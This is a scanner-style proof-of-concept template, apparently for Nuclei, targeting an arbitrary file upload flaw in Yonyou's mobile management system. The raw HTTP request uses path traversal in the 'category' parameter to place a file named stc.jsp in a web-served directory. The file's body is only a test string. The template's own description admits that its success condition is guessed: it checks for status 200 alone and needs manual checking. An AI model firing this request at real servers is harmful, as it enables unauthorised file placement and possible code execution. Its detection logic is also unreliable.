id: poc-14bd1bc4c83a39325488
info:
  name: 用友移动管理系统category任意文件上传漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: file-upload,2025
http:
- raw:
  - 'POST /mobsm/common/upload?category=../hotwebs/mobsm/uploadComponent HTTP/1.1

    Content-Type: multipart/form-data; boundary=00content0boundary00

    User-Agent: Java/1.8.0_381

    Host: {{Hostname}}

    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2

    Content-Length: 123

    Connection: close


    --00content0boundary00

    Content-Disposition: form-data; name="file"; filename="stc.jsp"


    test

    --00content0boundary00--'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
